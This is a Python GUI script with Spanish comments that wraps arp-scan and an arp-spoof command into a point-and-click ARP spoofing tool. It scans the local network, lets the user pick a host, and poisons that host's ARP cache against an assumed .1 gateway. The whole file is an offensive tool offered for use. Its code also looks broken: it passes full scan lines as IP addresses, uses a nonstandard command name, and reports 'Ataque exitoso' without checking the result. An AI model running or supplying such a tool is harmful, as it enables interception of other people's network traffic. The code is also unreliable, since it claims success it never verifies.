import subprocess as d
import tkinter as tk
from tkinter import messagebox

# FunciÃ³n para ejecutar el escaneo y mostrar las IPs en el Listbox
def ejecutar_escaneo():
    try:
        # Escanear la red
        print("Escaneando red..... ")
        ips = d.run(["arp-scan", "-I", "eth0", "--localnet"], capture_output=True, text=True)

        # Limpiar el Listbox antes de insertar nuevas IPs
        lista_ips.delete(0, tk.END)

        # Insertar las IPs encontradas en el Listbox
        for linea in ips.stdout.splitlines():
            if "192.168" in linea:  # Filtramos para incluir solo las IPs locales
                lista_ips.insert(tk.END, linea.strip())

        # Habilitar el botÃ³n de ataque
        boton_ataque.config(state=tk.NORMAL)
        messagebox.showinfo("Escaneo completado", "El escaneo ha finalizado. Elija una IP para atacar.")
    
    except Exception as e:
        messagebox.showerror("Error", f"OcurriÃ³ un error al realizar el escaneo: {e}")

# FunciÃ³n para ejecutar el ataque una vez que se ha seleccionado la IP
def ejecutar_ataque():
    try:
        # Obtener la IP seleccionada del Listbox
        seleccion = lista_ips.curselection()
        if not seleccion:
            messagebox.showerror("Error", "Debe seleccionar una IP para atacar.")
            return

        ip = lista_ips.get(seleccion[0])

        # Separar la IP por puntos
        partes_ip = ip.split(".")

        # Cambiar el Ãºltimo valor a '1'
        partes_ip[-1] = "1"

        # Unir las partes de nuevo para formar la nueva IP
        ip_modificada = ".".join(partes_ip)

        # Ejecutar el ataque spoof
        print(f"Realizando el ataque a {ip} usando {ip_modificada} como puerta de enlace.")
        atack = d.run(["arp-spoof", "-i", "eth0", "-t", ip, "-r", ip_modificada])

        # Mostrar el resultado
        messagebox.showinfo("Ã‰xito", f"Ataque exitoso a {ip}.")
    
    except Exception as e:
        messagebox.showerror("Error", f"OcurriÃ³ un error al ejecutar el ataque: {e}")

# Crear la ventana principal de la GUI
ventana = tk.Tk()
ventana.title("Herramienta ARP Spoof")

# BotÃ³n para realizar el escaneo
boton_escaneo = tk.Button(ventana, text="Realizar Escaneo de Red", command=ejecutar_escaneo)
boton_escaneo.pack(pady=10)

# Lista para mostrar las IPs encontradas
lista_ips = tk.Listbox(ventana, height=10, width=50)
lista_ips.pack(padx=10, pady=10)

# BotÃ³n para ejecutar el ataque (inicialmente deshabilitado)
boton_ataque = tk.Button(ventana, text="Ejecutar Ataque", command=ejecutar_ataque, state=tk.DISABLED)
boton_ataque.pack(pady=10)

# Ejecutar la ventana de la GUI
ventana.mainloop()

